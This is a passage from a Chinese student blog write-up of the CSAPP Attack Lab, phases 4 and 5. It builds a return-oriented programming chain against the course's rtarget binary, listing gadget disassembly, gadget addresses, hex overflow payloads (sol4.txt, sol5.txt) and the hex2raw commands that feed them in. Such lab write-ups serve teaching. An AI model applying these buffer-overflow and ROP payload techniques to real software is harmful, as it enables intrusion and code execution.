<p>编写答案 sol4.txt(注意小端法)</p>
<pre class="line-numbers language-none"><code class="language-none">00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00  00 00 00 00
ec 17 40 00 00 00 00 00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输入命令</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;hex2raw &lt;sol4.txt &gt;sol4r.txt &amp;&amp; .&#x2F;rtarget -q -i sol4r.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意是要运行rtarget!!!,不要搞错了兄弟们!!!</p>
<p>若出现以下界面则为成功通关</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220002.png" alt="image-20240302021056405"></p>
<h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h2><blockquote>
<p>坚持就是胜利!</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png" alt="image-20240229212126798"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png" alt="image-20240229212144522"></p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220043.png" alt="image-20240301232923919" style="zoom:200%;" />

<p>我们要通过ROP实现touch3的功能,touch3在phase_3的实现如下</p>
<pre class="line-numbers language-none"><code class="language-none">push $0x004018fa
lea 0x8(%rsp),%rdi
retq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>操作顺序如下:</p>
<ul>
<li>把touch3的地址压入栈中</li>
<li>把cookie的字符串指针地址存入到%rdi寄存器中</li>
</ul>
 <pre class="line-numbers language-none"><code class="language-none">35 39 62 39 39 37 66 61 00 # 00 是字符串末尾结束的\0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>地址怎么找?</p>
<p>这是要重点解决的问题.因为开启了栈的随机化,无法定位字符串精确位置但我们可以通过栈顶的地址+相对地址得到字符串的地址</p>
<p>如何把准确的地址传送到%rdi寄存器中呢?当然是提前计算好偏移量,然后用一个寄存器承载这个偏移量,再一点一点的把他搬运到%rdi当中啦</p>
<p>下面是寻找一条完整的通路的全过程(已经将函数从farm中的形式换为了rtarget中的形式,使得地址一目了然),在这里面”—&gt;”表示我倒序寻找通路时思维的前进试探,慢慢打通每一个节点,是寄存器转移顺序的反向,箭头后面表示的是Gadget的起始地址.</p>
<pre class="line-numbers language-none"><code class="language-none">0000000000401a03 &lt;addval_190&gt;:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq  
  ----- %rsp--&gt;%rax----0x401a06------------

00000000004019a0 &lt;addval_273&gt;:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

  ----%rax--&gt;%rdi----0x4019a2--------
  这样子就把%rsp的地址丢到%rdi当中了
  执行完getbuf时%rsp&#x3D; 0x5561dca8
  字符串应该是存在栈顶+相对位置

00000000004019d6 &lt;add_xy&gt;:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq  
----这个lea能把%rsi作为偏移量,计算好后再返回到%rdi中就好了---0x4019d6

所以我们就要想办法往%rsi中丢值,因为找不到pop %rsi的片段,只能从其他地方入手

0000000000401a11 &lt;addval_436&gt;:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   
  
  ---%ecx---&gt;%esi----0x401a13
 -----
  想试验下78 和c9会不会影响执行程序,不会影响,照样能运行
00000000004019e8 &lt;addval_113&gt;:
  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax
  4019ee:	c3                   	retq 
-----0x4019ea------

一步步往前找,每找到一个就看一下能不能通过pop得到该值

0000000000401a68 &lt;getval_311&gt;:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	retq   

---%edx---&gt;%ecx---0x401a69----

00000000004019db &lt;getval_481&gt;:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq  

  ---%edx---&gt;%eax---0x4019dd---
  
00000000004019ca &lt;getval_280&gt;:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq  
  ----pop %rax---0x4019cc----
  
找到了一条通路,所以我们就可以通过pop %rax的值来吧那个偏移量送到%rsi中,最后再把%rdi给更新了
就能够定位字符串的位置了
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来我们找到每个gadget的location,记得加上一点偏移量来定位到对应的Gadgets开头,然后我们就可以编写答案框架了</p>
<pre class="line-numbers language-none"><code class="language-none">----栈顶----
buf缓冲区,要填0x28个字符
movq %rsp--&gt;%rax            &lt;----gadget1    0x401a06   &lt;----%rsp
movq %rax---&gt;%rdi           &lt;----gadget2    0x4019a2
pop %rax		           &lt;----gadget3     0x4019cc
相对偏移量  0x48
movl %eax---&gt;%edx          &lt;---gadget4      0x4019dd
movl %edx---&gt;%ecx          &lt;---gadget5      0x401a69
movl %ecx----&gt;%esi	      &lt;---gadget6	0x401a13
lea (%rdi,%rsi,1),%rax	     &lt;---gadget7      0x4019d6
movl %rax---&gt;%rdi            &lt;----gadget8      0x4019a2
$touch3                                &lt;---gadget9        0x004018fa
cookie 			             &lt;---gadget10       35 39 62 39 39 37 66 61
---栈底---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>编写sol5.txt文档</p>
<pre class="line-numbers language-none"><code class="language-none">00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
69 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40  00 00 00 00 00
35 39 62 39 39 37 66 61<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输入命令</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;hex2raw &lt;sol5.txt &gt;sol5r.txt &amp;&amp; .&#x2F;rtarget -q -i sol5r.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>提交一手,完美通关!!!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220099.png" alt="image-20240302010809099"></p>
<p>至此,圆满完成通关!</p>
<h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><p>这篇详解是我在第一次做时边做边写的,做完phase_5后又兴致大发开始梳理编写,现在是3月2日的凌晨2:16分,大脑又困又转动.</p>
<p>实话实说,做这个真的很有意思,虽然我看了不少人的答案,毕竟一开始真的不能理解,不过现在大都理解了,这是一共的文件数量,做完整个lab.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220164.png" alt="image-20240302021849311"></p>
<p>希望下一次能够独立做出lab!这才是更大的进步!</p>
<blockquote>
<p>Good Luck:生命不止,奋斗不息</p>
</blockquote>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Vitus Apollo</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://vitus213.github.io/2024/02/27/lab3/">http://vitus213.github.io/2024/02/27/lab3/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">Vitus Apollo</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                                    <span class="chip bg-color">学习笔记</span>
                                </a>
                            
                                <a href="/tags/CSAPP/">
                                    <span class="chip bg-color">CSAPP</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/02/27/lab0/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="CSAPP自学指北">
                        
                        <span class="card-title">CSAPP自学指北</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-02-27
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CS/" class="post-category">
                                    CS
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                        <span class="chip bg-color">学习笔记</span>
                    </a>
                    
                    <a href="/tags/CSAPP/">
                        <span class="chip bg-color">CSAPP</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2024/02/27/VOA_2/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Quasar">
                        
                        <span class="card-title">Quasar</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-02-27
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/VOA/" class="post-category">
                                    VOA
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                        <span class="chip bg-color">学习笔记</span>
                    </a>
                    
                    <a href="/tags/VOA/">
                        <span class="chip bg-color">VOA</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>



<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2024-2025</span>
            
            <a href="/about" target="_blank">Vitus Apollo</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">76.7k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
                <span id="sitetime"> Loading ...</span>
                <script>
                    var calcSiteTime = function () {
                        var seconds = 1000;
                        var minutes = seconds * 60;
                        var hours = minutes * 60;
                        var days = hours * 24;
                        var years = days * 365;
                        var today = new Date();
                        var startYear = "2024";
                        var startMonth = "1";
                        var startDate = "1";
                        var startHour = "0";
                        var startMinute = "0";
                        var startSecond = "0";
                        var todayYear = today.getFullYear();
                        var todayMonth = today.getMonth() + 1;
                        var todayDate = today.getDate();
                        var todayHour = today.getHours();
                        var todayMinute = today.getMinutes();
                        var todaySecond = today.getSeconds();
                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                        var diff = t2 - t1;
                        var diffYears = Math.floor(diff / years);
                        var diffDays = Math.floor((diff / days) - diffYears * 365);

                        // 区分是否有年份.
                        var language = 'zh-CN';
                        if (startYear === String(todayYear)) {
                            document.getElementById("year").innerHTML = todayYear;
                            var daysTip = 'This site has been running for ' + diffDays + ' days';
                            if (language === 'zh-CN') {
                                daysTip = '本站已运行 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                daysTip = '本站已運行 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = daysTip;
                        } else {
                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
                                + diffDays + ' days';
                            if (language === 'zh-CN') {
                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
                        }
                    }

                    calcSiteTime();
                </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/Vitus213" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:zhzvitus@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2811215248" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2811215248" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
